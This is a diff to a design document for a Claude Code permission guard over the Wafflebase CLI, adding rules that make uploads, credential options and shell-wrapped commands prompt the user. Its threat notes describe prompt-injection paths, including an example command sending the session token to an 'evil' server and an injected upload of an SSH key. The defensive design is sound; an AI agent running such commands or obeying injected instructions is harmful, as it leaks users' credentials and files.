@@ -153,7 +153,10 @@ The guard reads the hook's stdin, and only when the Bash command is a
 | `read-only`, a *simple* command | `allow` | Reads are the bulk of a session; prompting on each trains users to click through |
 | `write` | `ask` (or `allow` with the *Auto-approve document writes* option, for a plain invocation) | "Ask before edits" default, accept-all opt-in |
 | `destructive`, a `--replace` variant, or a payload-dependent destructive variant | `ask`, always | Delete / overwrite are not undoable over the API today |
-| `read-only` that writes a local file (`export <file>`, `--out <file>`, `files download`) | `ask`, always | The server sees a read, the user's disk sees a write; the opt-in covers Wafflebase edits, not files |
+| `read-only` that writes a local file (`export <file>`, `--out <file>`, `files download`; `-` = stdout is exempt) | `ask`, always | The server sees a read, the user's disk sees a write; the opt-in covers Wafflebase edits, not files |
+| A write that uploads a local file (`files upload`, `images upload`, `… import <file>`) | `ask`, always | Sending the user's disk to a possibly shared workspace is not a document edit (`~/.ssh/id_rsa` is one prompt injection away) |
+| `login`, `logout`, `ctx switch`, `api-keys create`, `templates publish` | `ask`, always | Credentials, sign-in state or a document's audience — not document content |
+| Any command with `--server`, `--api-key` or `--profile` | `ask`, always | Sends the user's credentials to the named server |
 | Not classifiable (unknown subcommand, CLI newer than the table) | `ask` | Fail toward the prompt, never toward silence |
 | Not a `wafflebase` command | no output | The user's own rules apply unchanged |
 
@@ -175,9 +178,13 @@ than the three instances.
 Composition never *hides* a write either. Every `wafflebase` segment of a
 compound command is classified and the worst one decides; wrappers
 (`time`, `env`, `xargs`, `npx @wafflebase/cli`, `pnpm exec`, …) are
-looked through; a word the shell will expand makes its command
-unclassifiable, which asks; and when the name appears as a program more
-often than the segment walk found it (`$(…)`, backticks), the guard asks.
+looked through, and so are strings handed to another shell (`sh -c`,
+`bash -c`, `env -S`, `eval`); a word the shell will expand makes its
+command unclassifiable, which asks; and when the name appears as a
+program more often than the segment walk found it (`$(…)`, backticks),
+the guard asks. What it finds behind a wrapper is never auto-allowed. A
+form none of these covers falls to the user's own rules — not silently
+allowed, but not guaranteed to ask either.
 
 There is no shortcut for `--help` / `--version`: a command is judged by
 its path, so `docs delete --help` asks. Help that can be faked by a token
@@ -186,9 +193,14 @@ the shell discards is not worth the one prompt it saves.
 Global options (`--format json`, `--workspace <id>`, …) are skipped when
 locating the command path. `--dry-run` does **not** downgrade a write to
 `allow`: whether a command honors it is per-handler code, and a handler
-that forgot would turn the exception into an unprompted write. Only the
-`wafflebase` binary is recognized; `npx @wafflebase/cli …` and other
-launchers fall through to the normal prompt.
+that forgot would turn the exception into an unprompted write.
+
+Three root options are not skipped: `--server`, `--api-key` and
+`--profile` decide where the CLI connects and with which credential, and
+the CLI sends the saved session (and, on a 401, the refresh token) to
+whatever `--server` names. A read with one of them always asks — this is
+the path a prompt-injected "list docs from https://…" would take to
+exfiltrate the user's tokens.
 
 ### Session hook (`SessionStart`)
 
@@ -263,6 +275,20 @@ command syntax, so the CLI skill files remain the one place syntax lives.
   since `npm i -g` installs a `.cmd` shim there that `execFile` will not
   run; a missing CLI then reads as "status failed" rather than "not
   installed", which still sends Claude to check before doing anything.
+- **Credential exfiltration through `--server`.** Self-review found the
+  first guard auto-allowing `wafflebase --server https://evil… docs list`,
+  which sends the session JWT — and on a 401 the refresh token — to that
+  host, then stores whatever tokens it returns. The guard now asks on any
+  connection option. The CLI itself should also refuse to send a session
+  to a server other than the one that issued it; that is a CLI change
+  tracked under Future work, since it protects users without the plugin
+  too.
+- **Local-file exfiltration through uploads.** Uploads ask even under
+  auto-approve, for the same reason.
+- **Prompt injection via the session context.** Workspace names and
+  usernames are free text other people choose, and SessionStart context
+  outranks document text. The hook strips control and bidi characters,
+  caps the length and JSON-quotes every such value.
 - **Prompt injection via document content.** Core skill instruction, plus
   the guard: an injected "delete everything" still meets an `ask`.
 
@@ -274,7 +300,10 @@ command syntax, so the CLI skill files remain the one place syntax lives.
 3. **Revision API** — snapshot before an agent edit, restore after; turns
    the backup-copy convention into one-click undo.
 4. **Share-link API** for "share this with …".
-5. **Remote MCP connector** for claude.ai / Desktop / mobile: an OAuth 2.1
+5. **CLI: bind a session to its server** — refuse (or drop credentials)
+   when `--server` / `WAFFLEBASE_SERVER` differs from `session.server`,
+   so no caller can redirect a saved session elsewhere.
+6. **Remote MCP connector** for claude.ai / Desktop / mobile: an OAuth 2.1
    authorization server on the backend plus a hosted MCP server whose
    tools carry `readOnlyHint` / `destructiveHint` from the same schema
    `safety` the guard uses today.
